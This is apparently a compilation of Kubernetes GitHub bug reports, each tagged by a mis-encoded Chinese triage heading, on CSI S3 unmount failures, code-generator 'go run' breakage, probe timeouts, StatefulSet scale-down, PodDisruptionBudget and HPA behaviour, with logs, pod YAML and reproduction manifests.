Mar 14 13:31:01 ip-172-31-30-130.eu-central-1.compute.internal kubelet[3207]: E0314 13:31:01.583136    3207 nestedpendingoperations.go:348] Operation for "{volumeName:kubernetes.io/csi/ch.ctrox.csi.s3-driver^pvc-1ec40a67-78bd-4501-9dd8-bd2c4cb58648 podName:36180d66-5fa5-4393-a84d-df95afe5a369 nodeName:}" failed. No retries permitted until 2024-03-14 13:33:03.583103649 +0000 UTC m=+667507.460600342 (durationBeforeRetry 2m2s). Error: UnmountVolume.TearDown failed for volume "documents-storage-s3" (UniqueName: "kubernetes.io/csi/ch.ctrox.csi.s3-driver^pvc-1ec40a67-78bd-4501-9dd8-bd2c4cb58648") pod "36180d66-5fa5-4393-a84d-df95afe5a369" (UID: "36180d66-5fa5-4393-a84d-df95afe5a369") : kubernetes.io/csi: Unmounter.TearDownAt failed: rpc error: code = Internal desc = unmount failed: exit status 1
```

Even after I forthfully deleted a failed pod, errors did not disappear. 

Pods description: kubectl get pod survey-service-84cf8d9d49-xhbxq -o yaml                                                                 
```yaml
apiVersion: v1
kind: Pod
metadata:
  annotations:
    kubectl.kubernetes.io/restartedAt: "2024-03-06T20:55:56Z"
    <censored>
  creationTimestamp: "2024-03-12T11:19:39Z"
  deletionGracePeriodSeconds: 40
  deletionTimestamp: "2024-03-13T21:05:26Z"
  generateName: survey-service-84cf8d9d49-
  labels:
    app: survey-service
    pod-template-hash: 84cf8d9d49
  name: survey-service-84cf8d9d49-xhbxq
  namespace: test
  ownerReferences:
  - apiVersion: apps/v1
    blockOwnerDeletion: true
    controller: true
    kind: ReplicaSet
    name: survey-service-84cf8d9d49
    uid: da3867cc-cea3-49bc-b405-4d9d018541ae
  resourceVersion: "125333681"
  uid: 36180d66-5fa5-4393-a84d-df95afe5a369
spec:
  containers:
  - env:
    <censored>
    image: <censored>
    imagePullPolicy: Always
    lifecycle:
      preStop:
        exec:
          command:
          - sh
          - -c
          - sleep 10
    livenessProbe:
      failureThreshold: 3
      httpGet:
        path: /api/survey/actuator/health/liveness
        port: 8080
        scheme: HTTP
      periodSeconds: 5
      successThreshold: 1
      timeoutSeconds: 1
    name: survey-service
    ports:
    - containerPort: 8080
      protocol: TCP
    readinessProbe:
      failureThreshold: 3
      httpGet:
        path: /api/survey/actuator/health/readiness
        port: 8080
        scheme: HTTP
      periodSeconds: 5
      successThreshold: 1
      timeoutSeconds: 1
    resources:
      limits:
        memory: 2148Mi
      requests:
        memory: 1630Mi
    startupProbe:
      failureThreshold: 40
      httpGet:
        path: /api/survey/actuator/health/liveness
        port: 8080
        scheme: HTTP
      periodSeconds: 5
      successThreshold: 1
      timeoutSeconds: 1
    terminationMessagePath: /dev/termination-log
    terminationMessagePolicy: File
    volumeMounts:
    - mountPath: /proliance360-s3
      name: documents-storage-s3
    - mountPath: /var/run/secrets/kubernetes.io/serviceaccount
      name: <censored>
      readOnly: true
    - mountPath: <censored>
      name: <censored>
  - args:
    - echo ${VAULT_CONFIG?} | base64 -d > /home/vault/config.json && vault agent -config=/home/vault/config.json
    command:
    - /bin/sh
    - -ec
    env:
    - name: VAULT_LOG_LEVEL
      value: debug
    - name: VAULT_LOG_FORMAT
      value: standard
    - name: VAULT_CONFIG
      value: <censored>
    image: hashicorp/vault:1.13.1
    imagePullPolicy: IfNotPresent
    lifecycle: {}
    name: vault-agent
    resources:
      limits:
        memory: 64Mi
      requests:
        cpu: 25m
        memory: 16Mi
    securityContext:
      allowPrivilegeEscalation: false
      capabilities:
        drop:
        - ALL
      readOnlyRootFilesystem: true
      runAsGroup: 1000
      runAsNonRoot: true
      runAsUser: 100
    terminationMessagePath: /dev/termination-log
    terminationMessagePolicy: File
    volumeMounts:
    - mountPath: /var/run/secrets/kubernetes.io/serviceaccount
      name: <censored>
      readOnly: true
    - mountPath: /home/vault
      name: home-sidecar
    - mountPath: /vault/secrets
      name: vault-secrets
  dnsPolicy: ClusterFirst
  enableServiceLinks: true
  imagePullSecrets:
  - name: <censored>
  initContainers:
  - args:
    - echo ${VAULT_CONFIG?} | base64 -d > /home/vault/config.json && vault agent -config=/home/vault/config.json
    command:
    - /bin/sh
    - -ec
    env:
    - name: VAULT_LOG_LEVEL
      value: debug
    - name: VAULT_LOG_FORMAT
      value: standard
    - name: VAULT_CONFIG
      value: <censored>
    image: hashicorp/vault:1.13.1
    imagePullPolicy: IfNotPresent
    name: vault-agent-init
    resources:
      limits:
        memory: 64Mi
      requests:
        cpu: 25m
        memory: 16Mi
    securityContext:
      allowPrivilegeEscalation: false
      capabilities:
        drop:
        - ALL
      readOnlyRootFilesystem: true
      runAsGroup: 1000
      runAsNonRoot: true
      runAsUser: 100
    terminationMessagePath: /dev/termination-log
    terminationMessagePolicy: File
    volumeMounts:
    - mountPath: /home/vault
      name: home-init
    - mountPath: /var/run/secrets/kubernetes.io/serviceaccount
      name: <censored>
      readOnly: true
    - mountPath: /vault/secrets
      name: vault-secrets
  nodeName: <censored>
  preemptionPolicy: Never
  priority: 1000000
  priorityClassName: default-priority-class
  restartPolicy: Always
  schedulerName: default-scheduler
  securityContext: {}
  serviceAccount: <censored>
  serviceAccountName: <censored>
  terminationGracePeriodSeconds: 40
  tolerations:
  - effect: NoExecute
    key: node.kubernetes.io/not-ready
    operator: Exists
    tolerationSeconds: 300
  - effect: NoExecute
    key: node.kubernetes.io/unreachable
    operator: Exists
    tolerationSeconds: 300
  volumes:
  - name: documents-storage-s3
    persistentVolumeClaim:
      claimName: survey-service-s3-dataset
  - name: <censored>
    projected:
      defaultMode: 420
      sources:
      - serviceAccountToken:
          expirationSeconds: 3607
          path: token
      - configMap:
          items:
          - key: ca.crt
            path: ca.crt
          name: kube-root-ca.crt
      - downwardAPI:
          items:
          - fieldRef:
              apiVersion: v1
              fieldPath: metadata.namespace
            path: namespace
  - emptyDir:
      medium: Memory
    name: home-init
  - emptyDir:
      medium: Memory
    name: home-sidecar
  - emptyDir:
      medium: Memory
    name: vault-secrets
status:
  conditions:
  - lastProbeTime: null
    lastTransitionTime: "2024-03-12T11:19:43Z"
    status: "True"
    type: Initialized
  - lastProbeTime: null
    lastTransitionTime: "2024-03-13T21:05:36Z"
    reason: PodFailed
    status: "False"
    type: Ready
  - lastProbeTime: null
    lastTransitionTime: "2024-03-13T21:05:36Z"
    reason: PodFailed
    status: "False"
    type: ContainersReady
  - lastProbeTime: null
    lastTransitionTime: "2024-03-12T11:19:39Z"
    status: "True"
    type: PodScheduled
  containerStatuses:
  - containerID: containerd://54e3be5f2ff3c7e2f672044fcbc979b7d25fed5fadce924fb7917328dfc75713
    image: <censored>
    imageID: <censored>
    lastState: {}
    name: survey-service
    ready: false
    restartCount: 0
    started: false
    state:
      terminated:
        containerID: containerd://54e3be5f2ff3c7e2f672044fcbc979b7d25fed5fadce924fb7917328dfc75713
        exitCode: 137
        finishedAt: "2024-03-13T21:05:36Z"
        reason: Error
        startedAt: "2024-03-12T11:19:46Z"
  - containerID: containerd://5b36804afe1c892c8a8c2b85394dbd790f1beb040e2cc0c3cc59806f85440a96
    image: docker.io/hashicorp/vault:1.13.1
    imageID: docker.io/hashicorp/vault@sha256:b888abc3fc0529550d4a6c87884419e86b8cb736fe556e3e717a6bc50888b3b8
    lastState: {}
    name: vault-agent
    ready: false
    restartCount: 0
    started: false
    state:
      terminated:
        containerID: containerd://5b36804afe1c892c8a8c2b85394dbd790f1beb040e2cc0c3cc59806f85440a96
        exitCode: 0
        finishedAt: "2024-03-13T21:04:46Z"
        reason: Completed
        startedAt: "2024-03-12T11:19:47Z"
  hostIP: 172.31.30.130
  initContainerStatuses:
  - containerID: containerd://1534bbe8943624f5f30534a4fcaa440fc20ca8c5c4a3fea4510738078dbb29b6
    image: docker.io/hashicorp/vault:1.13.1
    imageID: docker.io/hashicorp/vault@sha256:b888abc3fc0529550d4a6c87884419e86b8cb736fe556e3e717a6bc50888b3b8
    lastState: {}
    name: vault-agent-init
    ready: true
    restartCount: 0
    state:
      terminated:
        containerID: containerd://1534bbe8943624f5f30534a4fcaa440fc20ca8c5c4a3fea4510738078dbb29b6
        exitCode: 0
        finishedAt: "2024-03-12T11:19:42Z"
        reason: Completed
        startedAt: "2024-03-12T11:19:42Z"
  phase: Failed
  podIP: 172.31.18.155
  podIPs:
  - ip: 172.31.18.155
  qosClass: Burstable
  startTime: "2024-03-12T11:19:39Z"
```
When I go to the node where the failed pod is, there is no active fuse filesystem mounted to  `/var/lib/kubelet/pods/36180d66-5fa5-4393-a84d-df95afe5a369/*:
```bash
[root@ip-172-31-30-130 csi-s3]# df -HT -t fuse
Filesystem           Type  Size  Used Avail Use% Mounted on
proliance360-staging fuse  1.2P     0  1.2P   0% /var/lib/kubelet/pods/c6ae84a5-208e-4e45-8133-442694c9a91b/volumes/kubernetes.io~csi/pvc-96b824dc-b7af-4b78-b08b-9567c4e52942/mount
proliance360-prod    fuse  1.2P     0  1.2P   0% /var/lib/kubelet/pods/366dcbaf-40f7-491a-aa84-801790cd12f4/volumes/kubernetes.io~csi/pvc-7d2b2c22-7134-421d-b2ad-c1a8b8faf376/mount
proliance360-test    fuse  1.2P     0  1.2P   0% /var/lib/kubelet/pods/df5557ff-b00c-4519-9e59-b7497b3b1ddb/volumes/kubernetes.io~csi/pvc-1ec40a67-78bd-4501-9dd8-bd2c4cb58648/mount`
```

In the csi-s3 container, I may found unfinished goofys process for `/var/lib/kubelet/pods/36180d66-5fa5-439
3-a84d-df95afe5a369/volumes/kubernetes.io~csi/pvc-1ec40a67-78bd-4501-9dd8-bd2c4cb58648/` volume:
```bash
PID   USER     TIME  COMMAND
    1 root      1:15 /s3driver --v=5 --endpoint=unix:///csi/csi.sock --nodeid=ip-172-31-30-130.eu-central-1.compute.internal
   20 root      0:22 [goofys]
   40 root      0:26 /bin/goofys --endpoint=https://s3.eu-central-1.amazonaws.com --type-cache-ttl 1s --stat-cache-ttl 1s --dir-mode 0777 --file-mode 0777 --ht
PID   USER     TIME  COMMAND
PID   USER     TIME  COMMAND
    1 root      1:15 /s3driver --v=5 --endpoint=unix:///csi/csi.sock --nodeid=ip-172-31-30-130.eu-central-1.compute.internal
   20 root      0:22 [goofys]
   40 root      0:26 /bin/goofys --endpoint=https://s3.eu-central-1.amazonaws.com --type-cache-ttl 1s --stat-cache-ttl 1s --dir-mode 0777 --file-mode 0777 --ht
tp-timeout 5m -o allow_other --profile=pvc-96b824dc-b7af-4b78-b08b-9567c4e52942 --region eu-central-1 proliance360-staging /var/lib/kubelet/pods/c6ae84a5-208e-
4e45-8133-442694c9a91b/volumes/kubernetes.io~csi/pvc-96b824dc-b7af-4b78-b08b-9567c4e52942/mount
   62 root      3:27 /bin/goofys --endpoint=https://s3.eu-central-1.amazonaws.com --type-cache-ttl 1s --stat-cache-ttl 1s --dir-mode 0777 --file-mode 0777 --ht
tp-timeout 5m -o allow_other --profile=pvc-7d2b2c22-7134-421d-b2ad-c1a8b8faf376 --region eu-central-1 proliance360-prod /var/lib/kubelet/pods/366dcbaf-40f7-491
a-aa84-801790cd12f4/volumes/kubernetes.io~csi/pvc-7d2b2c22-7134-421d-b2ad-c1a8b8faf376/mount
   87 root      0:13 /bin/goofys --endpoint=https://s3.eu-central-1.amazonaws.com --type-cache-ttl 1s --stat-cache-ttl 1s --dir-mode 0777 --file-mode 0777 --ht
tp-timeout 5m -o allow_other --profile=pvc-1ec40a67-78bd-4501-9dd8-bd2c4cb58648 --region eu-central-1 proliance360-test /var/lib/kubelet/pods/36180d66-5fa5-439
3-a84d-df95afe5a369/volumes/kubernetes.io~csi/pvc-1ec40a67-78bd-4501-9dd8-bd2c4cb58648/mount
  564 root      0:00 /bin/goofys --endpoint=https://s3.eu-central-1.amazonaws.com --type-cache-ttl 1s --stat-cache-ttl 1s --dir-mode 0777 --file-mode 0777 --ht
tp-timeout 5m -o allow_other --profile=pvc-1ec40a67-78bd-4501-9dd8-bd2c4cb58648 --region eu-central-1 proliance360-test /var/lib/kubelet/pods/df5557ff-b00c-451
9-9e59-b7497b3b1ddb/volumes/kubernetes.io~csi/pvc-1ec40a67-78bd-4501-9dd8-bd2c4cb58648/mount
  607 root      0:00 sh -c clear; (bash || ash || sh)
  614 root      0:00 ash
  616 root      0:00 sh -c clear; (bash || ash || sh)
  624 root      0:00 ash
  652 root      0:00 ps aux
  653 root      0:00 less
```

The pods directory `/var/lib/kubelet/pods/36180d66-5fa5-439 3-a84d-df95afe5a369/volumes/kubernetes.io~csi/pvc-1ec40a67-78bd-4501-9dd8-bd2c4cb58648/mount` actually exists on the node, but It is empty:
```bash
/var/lib/kubelet/pods/36180d66-5fa5-4393-a84d-df95afe5a369/volumes/kubernetes.io~csi/pvc-1ec40a67-78bd-4501-9dd8-bd2c4cb58648/mount # ls -al
total 0
drwxr-x---    2 root     root             6 Mar 12 11:19 .
drwxr-x---    3 root     root            40 Mar 12 11:19 ..
```
I guess that my pod was stuck in a terminating state because Kubelet can not finish some tasks (maybe admissions controllers involved, garbage collector) and it leaves the pod in this state. I want to fix that. 

Worth mentioned that if the pod finished without error (not failed), then no s3 errors/problems occur
Thanks in advance.

#### What did you expect to happen?

Kubelet completely terminates the failed pod. The volume management is healthy. 

#### How can we reproduce it (as minimally and precisely as possible)?

The pod which uses s3 storage volumes should be failed. The rest is in "What happened?" secrion.

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version 
Client Version: version.Info{Major:"1", Minor:"26", GitVersion:"v1.26.3", GitCommit:"9e644106593f3f4aa98f8a84b23db5fa378900bd", GitTreeState:"clean", BuildDate:"2023-03-15T13:33:11Z", GoVersion:"go1.19.7", Compiler:"gc", Platform:"darwin/arm64"}
Kustomize Version: v4.5.7
Server Version: version.Info{Major:"1", Minor:"27+", GitVersion:"v1.27.9-eks-5e0fdde", GitCommit:"3f8ed3d5017d988600f597734a4851930eda35a6", GitTreeState:"clean", BuildDate:"2024-01-02T20:34:38Z", GoVersion:"go1.20.12", Compiler:"gc", Platform:"linux/amd64"}
```

</details>


#### Cloud provider

AWS EKS 1.27


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
NAME="Amazon Linux"
VERSION="2"
ID="amzn"
ID_LIKE="centos rhel fedora"
VERSION_ID="2"
PRETTY_NAME="Amazon Linux 2"
ANSI_COLOR="0;33"
CPE_NAME="cpe:2.3:o:amazon:amazon_linux:2"
HOME_URL="https://amazonlinux.com/"
SUPPORT_END="2025-06-30"
$ uname -a
Linux  5.10.209-198.858.amzn2.x86_64 #1 SMP Tue Feb 13 18:46:41 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux


```
</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>
```console
$ ctr --version
ctr github.com/containerd/containerd 1.7.11

```
</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>
DLF Helm chart:
```yaml
apiVersion: v2
name: dlf-chart
description: Dataset Lifecycle Framework chart
type: application
version: 0.1.0
appVersion: 0.1.0

dependencies:
  - name: csi-sidecars-rbac
    version: 0.1.0
    condition: csi-sidecars-rbac.enabled
  - name: csi-nfs-chart
    version: 0.1.0
    condition: csi-nfs-chart.enabled
  - name: csi-s3-chart
    version: 0.1.0
    condition: csi-s3-chart.enabled
  - name: csi-h3-chart
    version: 0.1.0
    condition: csi-h3-chart.enabled
  - name: dataset-operator-chart
    version: 0.1.0
    condition: dataset-operator-chart.enabled
```

csi-attacher-s3 - image registry.k8s.io/sig-storage/csi-attacher:v3.3.0 ;
csi-provisioner-s3 - image registry.k8s.io/sig-storage/csi-provisioner:v2.2.2
csi-s3 - image quay.io/datashim-io/csi-s3:0.3.0
driver-registrar - image registry.k8s.io/sig-storage/csi-node-driver-registrar:v2.3.0
dataset-operator - image quay.io/datashim-io/dataset-operator:0.3.0

</details>


### åˆ†æç»“æœ

ä¸æ¶‰åŠ

---

## Issue #123933 Code generator is no longer usable via `go run`

- Issue é“¾æ¥ï¼š[#123933](https://github.com/kubernetes/kubernetes/issues/123933)

### Issue å†…å®¹

#### What happened?

The code generator was usable via `go run` up until v1.30.0-alpha.3:

```console
$ go version
go version go1.22.1 linux/amd64
```

```console
$ go run k8s.io/code-generator/cmd/client-gen@v0.30.0-alpha.3 --help
Usage of /tmp/go-build2845286753/b001/exe/client-gen:
[...]
```

Since v1.30.0-beta.0:

```console
$ go run k8s.io/code-generator/cmd/client-gen@v0.30.0-beta.0 --help
go: k8s.io/code-generator/cmd/client-gen@v0.30.0-beta.0 (in k8s.io/code-generator@v0.30.0-beta.0):
        The go.mod file for the module providing named packages contains one or
        more replace directives. It must not contain directives that would cause
        it to be interpreted differently than if it were the main module.
```

#### What did you expect to happen?

The code generator works via `go run`.

#### How can we reproduce it (as minimally and precisely as possible)?

See above.

#### Anything else we need to know?

This may not be a supported way to use the code generator at all, but it worked quite well until now, and I thought I'd bring this to attention. IIUC the offending replace directive came in as part of the workspace support (#123529) and I'm not sure there's anything that can be done about it.

#### Kubernetes version

<details>

```console
$ kubectl version
# v1.30.0-beta.0
```

</details>


#### Cloud provider

N/A


#### OS version

<details>

```console
$ cat /etc/os-release
BUG_REPORT_URL="https://github.com/NixOS/nixpkgs/issues"
BUILD_ID="23.11.20240311.ddcd759"
DOCUMENTATION_URL="https://nixos.org/learn.html"
HOME_URL="https://nixos.org/"
ID=nixos
LOGO="nix-snowflake"
NAME=NixOS
PRETTY_NAME="NixOS 23.11 (Tapir)"
SUPPORT_END="2024-06-30"
SUPPORT_URL="https://nixos.org/community.html"
VERSION="23.11 (Tapir)"
VERSION_CODENAME=tapir
VERSION_ID="23.11"
$ uname -srvmo
Linux 6.6.21 #1-NixOS SMP PREEMPT_DYNAMIC Wed Mar  6 14:48:45 UTC 2024 x86_64 GNU/Linux
```

</details>


#### Install tools

N/A

#### Container runtime (CRI) and version (if applicable)

N/A

#### Related plugins (CNI, CSI, ...) and versions (if applicable)

N/A

### åˆ†æç»“æœ

ä¸æ¶‰åŠ

---

## Issue #123931 readiness prober timeout do not run as expected

- Issue é“¾æ¥ï¼š[#123931](https://github.com/kubernetes/kubernetes/issues/123931)

### Issue å†…å®¹

#### What happened?

1. We meet the issue that the readiness probe timeout do not run as expected.  It run as 2mins + timeout setting in actual 

2. According  to the below official kubernets doc, it define that the timeoutSeconds: Number of seconds after which the probe times out. Defaults to 1 second. Minimum value is 1.  After I read this infromation from the doc , i think it means if the prober command running time exceeded the timeout period, the kubelet will stop this prober action and start the next prober, butl it not in actual.  The next prober action  will run after the last prober  action completed or last prober action lasted (2mins + timeout setting).

https://kubernetes.io/docs/tasks/configure-pod-container/configure-liveness-readiness-startup-probes/#define-readiness-probes

3. I also check the code, and find that it deifine timeous =timeout setting  + default timeout (2 minutes) as timeout to leave some time for  the runtime to do cleanup uless timeout setting is 0s. I think 2 minutes is used for the containerd runtime to prepare necessary action. But the doc description make the customer confusion easily if not add  some details
https://github.com/kubernetes/kubernetes/blob/d1a2a134c532109540025c990697a6900c2e62fc/pkg/kubelet/cri/remote/remote_runtime.go#L469
![image](https://github.com/kubernetes/kubernetes/assets/88937681/3a53ef8c-e01a-40c9-8582-65c56feabb88)




#### What did you expect to happen?

Could you plz modify the deafult timeout in code  or add description in  the officail doc ?

#### How can we reproduce it (as minimally and precisely as possible)?

1. create a configmap  like below. it show the two commd: 1. create a file named with the current time; 2.  sleep 300s
```
apiVersion: v1
data:
  container-readiness-probe-handler.sh: |-
    #!/bin/sh
    touch /tmp/$(date +'%Y-%m-%d-%H-%M-%S')
    sleep 300
kind: ConfigMap
metadata:
  name: tesh
  namespace: default
```


2. create a pod with the nginx image and mount the above configmap as the volume  to the /script path.  Setting the timeoutSeconds as 8s
```
 containers:
  - image: nginx:latest
    imagePullPolicy: Always
    name: nginx-test
    readinessProbe:
      exec:
        command:
        - /bin/sh
        - /script/container-readiness-probe-handler.sh
      failureThreshold: 7
      initialDelaySeconds: 6
      periodSeconds: 10
      successThreshold: 1
      timeoutSeconds: 8
    resources:
      requests:
        cpu: 250m
        memory: 512Mi
    - mountPath: /script
      name: volume-1710223576413
  volumes:
  - configMap:
      defaultMode: 493
      name: tesh
    name: volume-1710223576413
```
    
    
   3.  After the pod running , will find that the new file will be created every (2mins+8sï¼‰=128s in /tmp path
![image](https://github.com/kubernetes/kubernetes/assets/88937681/d426d039-81d8-4396-8255-2aca74ed2a0c)

   4.  strace the cri which pull the containerd and find that  it will trigger the prober action every  (2mins+8sï¼‰
![image](https://github.com/kubernetes/kubernetes/assets/88937681/6cbc9a21-6e3e-40d2-bf30-70dbe5aea9de)

5. if the  timeout period setting < prober command runiig time< 2 mins.  The new readiness prober will run after last prober command completed, not timeout  period



#### Anything else we need to know?

_No response_

#### Kubernetes version

Client Version: v1.29.2
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.28.3-aliyun.1



#### Cloud provider

Alibaba Cloud


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
NAME="Alibaba Cloud Linux (Aliyun Linux)"
VERSION="2.1903 LTS (Hunting Beagle)"
ID="alinux"
ID_LIKE="rhel fedora centos anolis"
VERSION_ID="2.1903"
PRETTY_NAME="Alibaba Cloud Linux (Aliyun Linux) 2.1903 LTS (Hunting Beagle)"
ANSI_COLOR="0;31"
HOME_URL="https://www.aliyun.com/"

$ uname -a
Linux iZj6c9edi9gpcd5qesfwxvZ 4.19.91-25.6.al7.x86_64 #1 SMP Thu Feb 10 19:15:17 CST 2022 x86_64 x86_64 x86_64 GNU/Linux


#### Install tools

<details>


```
</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

ä¸æ¶‰åŠ

---

## Issue #123918 StatefulSet with podManagementPolicy=OrderedReady and minReadySeconds does not scale down correctly

- Issue é“¾æ¥ï¼š[#123918](https://github.com/kubernetes/kubernetes/issues/123918)

### Issue å†…å®¹

#### What happened?

1. create the OrderedReady statefulset

```
apiVersion: apps/v1
kind: StatefulSet
metadata:
  name: nginx-roll
spec:
  replicas: 2
  minReadySeconds: 30
  podManagementPolicy: OrderedReady
  updateStrategy:
    type: RollingUpdate
  selector:
    matchLabels:
      app: nginx-roll
  template:
    metadata:
      labels:
        app: nginx-roll
    spec:
      containers:
      - name: nginx
        image: ghcr.io/nginxinc/nginx-unprivileged:latest
        ports:
        - containerPort: 80
          name: web
```


2. wait for the 2nd pod to become ready, but not available (can also happen when the pod has lost availability)
3. scale the statefulset to 1 replica
 
```
kubectl scale statefulset nginx-roll --replicas=1
```

4. the 2nd pod should start terminating immediately but instead it hangs until the KCM is fully resynced


#### What did you expect to happen?

the 2nd pod should start terminating immediately

#### How can we reproduce it (as minimally and precisely as possible)?

see `What happened?` 

#### Anything else we need to know?

we can see in the logs that the syncs are happening but the firstUnhealthyPod variable is not resolved, so the progress is stalled

```
stateful_set_control.go:509] "StatefulSet is waiting for Pod to be Available prior to scale down" statefulSet="test/nginx-roll" pod=""
```

We even get  the availability check scheduled and called, but because a prior scheduling already ocurred, the new check is thrown away (should not happen, but a similar issue was reported in https://github.com/kubernetes/kubernetes/issues/119352 and a fix is blocked on https://github.com/kubernetes/kubernetes/pull/112328)

```
stateful_set.go:243] "StatefulSet will be enqueued after minReadySeconds for availability check" statefulSet="test/nginx-roll" minReadySeconds=30
```

the sync will be called too soon and resolves again in 
```
stateful_set_control.go:509] "StatefulSet is waiting for Pod to be Available prior to scale down" statefulSet="test/nginx-roll" pod=""
```

The next sync will ocurr when KCM is fully resynced which can be a long time (depending on KCM resync period)



statefulset controller should scale down the first condemned pod as soon as it can, but keep the predecessor pods running available

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.29.2
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.29.0-rc.1.3813+a0beecc776d492-dirty
```

</details>


#### Cloud provider

NA


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

ä¸æ¶‰åŠ

---

## Issue #123911 PDB views pods in Terminating state as available

- Issue é“¾æ¥ï¼š[#123911](https://github.com/kubernetes/kubernetes/issues/123911)

### Issue å†…å®¹

#### What happened?

1. I have a statefulset with 2 pods. The grace period for these pods is long, so the terminating state can endure over hours, but that's not important.
2. I have a basic PDB of minAvailable: 1
3. I have a service that distributes across both pods.
4. I rollout restart the sts, which first restarts pod-1, then tries to restart pod-0.
5. While pod-0 is still in status "Terminating", I issue a second rollout restart to the sts.
6. K8s restarts pod-1 again, while pod-0 is still Terminating from the first restart.
7. My service is effectively down, as my service returns 503 Service Unavailable, because all pods are Terminating.

#### What did you expect to happen?

6. K8s waits for pod-0 to be restarted and ready again before continuing to restart pod-1
7. My service stays available, as there is always at least one pod that is ready AND Running, which is what I expect from the PDB

#### How can we reproduce it (as minimally and precisely as possible)?

```yaml
apiVersion: apps/v1
kind: StatefulSet
metadata:
  labels:
    app: pdb-fail
  name: pdb-fail
spec:
  podManagementPolicy: Parallel # Without this, the STS stays available regardless of whether there is a PDB in place or not
  replicas: 2
  selector:
    matchLabels:
      app: pdb-fail
  serviceName: pdb-fail
  template:
    metadata:
      labels:
        app: pdb-fail
      name: pdb-fail
    spec:
      containers:
        - name: pdb-fail
          image: nginx
          lifecycle:
            preStop:
              exec:
                command:
                  - sleep
                  - "15"
      terminationGracePeriodSeconds: 1000

---
apiVersion: policy/v1
kind: PodDisruptionBudget
metadata:
  name: pdb-fail
spec:
  maxUnavailable: 1
  selector:
    matchLabels:
      app: pdb-fail

```
After successful deployment of the sts, you can use the following script or run these manually to force both pods into "Terminating" state:
```bash
kubectl get pod,sts,pdb
kubectl rollout restart sts pdb-fail
kubectl get pod,sts,pdb
sleep 25
kubectl get pod,sts,pdb
kubectl rollout restart sts pdb-fail
kubectl get pod,sts,pdb
echo Tada
```

Output looks as follows:
```text
$ bash trigger-issue.sh
NAME             READY   STATUS    RESTARTS   AGE
pod/pdb-fail-0   1/1     Running   0          63s
pod/pdb-fail-1   1/1     Running   0          82s

NAME                        READY   AGE
statefulset.apps/pdb-fail   2/2     5m3s

NAME                                  MIN AVAILABLE   MAX UNAVAILABLE   ALLOWED DISRUPTIONS   AGE
poddisruptionbudget.policy/pdb-fail   N/A             1                 1                     5m3s
statefulset.apps/pdb-fail restarted
NAME             READY   STATUS        RESTARTS   AGE
pod/pdb-fail-0   1/1     Running       0          63s
pod/pdb-fail-1   1/1     Terminating   0          82s

NAME                        READY   AGE
statefulset.apps/pdb-fail   2/2     5m3s

NAME                                  MIN AVAILABLE   MAX UNAVAILABLE   ALLOWED DISRUPTIONS   AGE
poddisruptionbudget.policy/pdb-fail   N/A             1                 0                     5m3s
NAME             READY   STATUS        RESTARTS   AGE
pod/pdb-fail-0   1/1     Terminating   0          84s
pod/pdb-fail-1   1/1     Running       0          5s

NAME                        READY   AGE
statefulset.apps/pdb-fail   2/2     5m24s

NAME                                  MIN AVAILABLE   MAX UNAVAILABLE   ALLOWED DISRUPTIONS   AGE
poddisruptionbudget.policy/pdb-fail   N/A             1                 0                     5m24s
statefulset.apps/pdb-fail restarted
NAME             READY   STATUS        RESTARTS   AGE
pod/pdb-fail-0   1/1     Terminating   0          84s
pod/pdb-fail-1   1/1     Terminating   0          5s

NAME                        READY   AGE
statefulset.apps/pdb-fail   2/2     5m24s

NAME                                  MIN AVAILABLE   MAX UNAVAILABLE   ALLOWED DISRUPTIONS   AGE
poddisruptionbudget.policy/pdb-fail   N/A             1                 0                     5m24s
Tada
```
#### Anything else we need to know?

I don't want to allow my service to route traffic to terminating pods, though I know that's an option.
I want the PDB to view terminating pods as unavailable, just like the default behavior of a service.

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.29.0
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.28.3
```

</details>


#### Cloud provider

<details>
Azure Kubernetes Service
</details>


#### OS version

<details>

```console
# On Linux (In WSL):
$ cat /etc/os-release
PRETTY_NAME="Ubuntu 22.04.4 LTS"
NAME="Ubuntu"
VERSION_ID="22.04"
VERSION="22.04.4 LTS (Jammy Jellyfish)"
VERSION_CODENAME=jammy
ID=ubuntu
ID_LIKE=debian
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
UBUNTU_CODENAME=jammy
$ uname -a
Linux DESKTOP-J27URRA 5.15.133.1-microsoft-standard-WSL2 #1 SMP Thu Oct 5 21:02:42 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux

# On Windows (Host for WSL):
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
BuildNumber  Caption                          OSArchitecture  Version
22631        Microsoft Windows 11 Enterprise  64-bit          10.0.22631
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

ä¸æ¶‰åŠ

---

## Issue #123885 HPA doesn't work because HPA reads cronjobs resources with a "completed" status.

- Issue é“¾æ¥ï¼š[#123885](https://github.com/kubernetes/kubernetes/issues/123885)

### Issue å†…å®¹

#### What happened?


HPA Target is unknown state.
```
â¯ k get hpa
NAME             REFERENCE                   TARGETS         MINPODS   MAXPODS   REPLICAS   AGE
